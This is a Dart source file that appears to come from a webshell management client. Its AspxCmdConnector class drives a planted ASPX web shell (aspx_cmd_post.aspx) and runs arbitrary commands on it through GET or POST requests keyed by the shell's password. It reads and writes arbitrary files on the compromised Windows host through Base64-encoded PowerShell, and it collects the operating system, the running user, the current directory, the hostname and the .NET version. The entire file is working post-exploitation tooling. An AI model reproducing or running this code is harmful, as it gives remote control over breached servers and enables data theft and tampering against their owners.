import 'dart:async';
import 'dart:convert';

import 'package:http/http.dart' as http;

import 'asp_wscript_connector.dart';
import 'shell_connector.dart';

/// `aspx_cmd_post.aspx`：`System.Diagnostics.Process` 命令执行
///
/// .NET ASPX 版本，输出为纯文本（不需要 HTML 解码）。
/// 继承 [AspWscriptConnector] 中的 Windows 文件操作逻辑；
/// 仅覆盖 [sendRawCommand] 去掉 HTML 解码，并支持 GET / POST。
class AspxCmdConnector extends AspWscriptConnector {
  AspxCmdConnector(super.webshell);

  @override
  Set<ConnectorCapability> get capabilities => const {
        ConnectorCapability.shellExec,
        ConnectorCapability.fileRead,
        ConnectorCapability.fileWrite,
      };

  @override
  Future<String> sendRawCommand(String cmd) async {
    try {
      final uri = Uri.parse(webshell.url);
      http.Response response;

      if (webshell.method == 'POST') {
        response = await http
            .post(
              uri,
              headers: {'Content-Type': 'application/x-www-form-urlencoded'},
              body: {_param: cmd},
            )
            .timeout(const Duration(seconds: 20));
      } else {
        final params = Map<String, String>.from(uri.queryParameters);
        params[_param] = cmd;
        response = await http
            .get(uri.replace(queryParameters: params))
            .timeout(const Duration(seconds: 20));
      }

      if (response.statusCode != 200) return '[HTTP ${response.statusCode}]';
      // .NET Process 输出为纯文本，直接返回，无需 HTML 解码
      return response.body;
    } on TimeoutException {
      return '[Timeout]';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }

  String get _param =>
      webshell.password?.isNotEmpty == true ? webshell.password! : 'cmd';

  // ── 覆盖文件读写：.NET 可通过 PowerShell 做 Base64 传输 ──────────────────

  @override
  Future<String> readFile(String path) async {
    // PowerShell: 读取文件字节 → Base64
    final ps =
        '[Convert]::ToBase64String([IO.File]::ReadAllBytes(\'$path\'))';
    final raw =
        await sendRawCommand('powershell -NoProfile -Command "$ps"');
    if (raw.isEmpty || raw.startsWith('[')) return '[文件不存在或无权读取]';
    try {
      return utf8.decode(base64.decode(raw.trim()));
    } catch (_) {
      return '[读取失败：编码错误]';
    }
  }

  @override
  Future<bool> writeFile(String path, String content) async {
    final b64 = base64.encode(utf8.encode(content));
    // PowerShell: Base64 → 写入文件
    final ps =
        '[IO.File]::WriteAllBytes(\'$path\', [Convert]::FromBase64String(\'$b64\'))';
    final r = await sendRawCommand(
        'powershell -NoProfile -Command "$ps" && echo 1');
    return r.trim().contains('1');
  }

  @override
  Future<Map<String, String>> getSystemInfo() async {
    const sep = '###MATRIX_SEP###';
    // 额外获取 .NET CLR 版本
    final cmd = [
      'echo ${sep}OS${sep}',
      'ver',
      'echo ${sep}USER${sep}',
      'echo %USERNAME%',
      'echo ${sep}PWD${sep}',
      'cd',
      'echo ${sep}HOST${sep}',
      'hostname',
      'echo ${sep}CLR${sep}',
      r'powershell -NoProfile -Command "[System.Environment]::Version.ToString()"',
    ].join(' & ');
    const keyMap = {
      'OS': 'OS',
      'USER': '运行用户',
      'PWD': '当前目录',
      'HOST': '主机名',
      'CLR': '.NET CLR 版本',
    };
    return AspxCmdConnector._parseSep(await sendRawCommand(cmd), sep, keyMap);
  }

  static Map<String, String> _parseSep(
      String raw, String sep, Map<String, String> keyMap) {
    final result = <String, String>{};
    String? currentKey;
    final buf = StringBuffer();
    for (final line in raw.split('\n')) {
      final t = line.trim();
      if (t.startsWith(sep) && t.endsWith(sep) && t.length > sep.length * 2) {
        if (currentKey != null && buf.isNotEmpty) {
          final label = keyMap[currentKey] ?? currentKey;
          result[label] = buf.toString().trim();
          buf.clear();
        }
        currentKey = t.substring(sep.length, t.length - sep.length);
      } else if (currentKey != null) {
        if (buf.isNotEmpty) buf.write('\n');
        buf.write(t);
      }
    }
    if (currentKey != null && buf.isNotEmpty) {
      final label = keyMap[currentKey] ?? currentKey;
      result[label] = buf.toString().trim();
    }
    return result;
  }
}
